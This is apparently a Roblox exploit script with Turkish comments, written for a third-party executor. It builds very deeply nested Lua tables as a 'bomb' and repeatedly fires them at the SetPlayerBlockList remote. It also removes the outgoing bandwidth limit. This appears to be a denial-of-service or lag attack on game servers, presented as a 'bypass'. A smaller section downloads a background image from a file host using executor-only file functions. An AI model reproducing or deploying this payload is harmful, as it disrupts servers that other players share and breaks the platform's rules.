-- Ayarlar
local BypassConfig = {
    Power = 97000,
    PCPower = 97000,
    MobilePower = 72000,
    Mode = "PC",
    SpamDelay = 0.12,
    Version = "V1",
}
local bypassRunning, bypassBomb, bypassThread = false, nil, nil

local function buildBombV1(power)
    local depth, main, spam = 186, {}, {{}}
    local z = spam[1]
    for _ = 1, depth do local t = {}; table.insert(z, t); z = t end
    local maxRep = math.floor(power / (depth + 2))
    for _ = 1, maxRep do table.insert(main, spam) end
    return main
end

local function buildBombV2(power)
    local depth, main, spam = 296, {}, {{}}
    local z = spam[1]
    for _ = 1, depth do local t = {}; table.insert(z, t); z = t end
    local maxRep = math.floor(power / (depth + 2))
    for _ = 1, maxRep do table.insert(main, spam) end
    return main
end

local function buildBomb(power)
    return BypassConfig.Version == "V1" and buildBombV1(power) or buildBombV2(power)
end

local function startBypass()
    if bypassRunning then return true end
    bypassRunning = true
    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
    bypassBomb = buildBomb(BypassConfig.Power)
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    local remote = rrs and rrs:FindFirstChild("SetPlayerBlockList")
    if not remote then bypassRunning = false; return false end
    bypassThread = task.spawn(function()
        while bypassRunning do
            if bypassBomb then pcall(function() remote:FireServer(bypassBomb) end) end
            task.wait(BypassConfig.SpamDelay)
        end
    end)
    return true
end

local function stopBypass()
    bypassRunning = false
    if bypassThread then pcall(task.cancel, bypassThread); bypassThread = nil end
    bypassBomb = nil
    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
end

local function updateBypassPower(p)
    local max = BypassConfig.Mode == "PC" and 150000 or 100000
    BypassConfig.Power = math.clamp(p, 10000, max)
    if BypassConfig.Mode == "PC" then BypassConfig.PCPower = BypassConfig.Power
    else BypassConfig.MobilePower = BypassConfig.Power end
    if bypassRunning then stopBypass(); task.wait(0.05); startBypass() end
end

-- Arka plan
local BYPASS_BACKGROUND_FALLBACK = "rbxassetid://94763047376005"
local function resolveBackground()
    local loader = nil
    pcall(function()
        loader = (typeof(getcustomasset) == "function" and getcustomasset)
            or (typeof(getsynasset) == "function" and getsynasset)
    end)
    if not loader or typeof(writefile) ~= "function" or typeof(isfile) ~= "function" then
        return BYPASS_BACKGROUND_FALLBACK
    end
    local file = "CrystalBypass_bg.png"
    local url = "https://files.catbox.moe/5slzyj.png"
    local has = false
    pcall(function() has = isfile(file) end)
    if not has then
        local ok, data = pcall(function() return game:HttpGet(url) end)
        if not ok or type(data) ~= "string" or data:sub(1,8) ~= "\137PNG\r\n\26\n" then
            return BYPASS_BACKGROUND_FALLBACK
        end
        if not pcall(writefile, file, data) then return BYPASS_BACKGROUND_FALLBACK end
    end
    local ok, asset = pcall(loader, file)
    if ok and type(asset) == "string" and asset ~= "" then return asset end
    return BYPASS_BACKGROUND_FALLBACK
end

